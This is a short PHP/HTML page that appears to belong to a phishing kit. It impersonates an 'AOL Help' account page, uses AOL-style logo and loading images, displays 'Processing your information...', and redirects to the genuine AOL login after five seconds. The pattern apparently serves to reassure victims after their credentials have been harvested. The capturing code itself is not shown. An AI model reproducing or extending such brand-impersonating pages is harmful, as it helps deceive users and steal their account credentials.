<?php


?>


<html>
	<head>
		<meta http-equiv="refresh" content="5; url=https://login.aol.com/">
		<title>My Account - AOL Help</title>
		<link rel="stylesheet" type="text/css" href="style/style.css">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="icon" href="imgs/favicon.ico" type="image/x-icon"/>
		<link rel="shortcut icon" href="imgs/favicon.ico" type="image/x-icon"/>
	</head>
	
	<body>
		<div id="process">
			<img src="imgs/logo-marker.gif">
			
			<p>Processing your information...</p>
			
			<img src="imgs/loading.gif" width="5%">
		</div>
	
	</body>

</html>